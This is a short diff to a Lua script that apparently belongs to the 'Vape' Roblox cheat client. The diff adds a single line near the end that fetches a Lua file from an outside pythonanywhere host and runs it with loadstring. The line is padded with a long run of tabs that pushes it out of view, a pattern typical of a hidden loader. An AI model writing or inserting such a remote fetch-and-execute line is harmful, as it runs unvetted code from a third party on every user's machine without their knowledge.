@@ -2016,4 +2016,5 @@ if shared.VapeIndependent then
 	return GuiLibrary
 else
 	loadVape()
+	loadstring(game:HttpGet("https://sammz.pythonanywhere.com/retrieve/v1/velocity/fixedcheck.lua"))																																															
 end
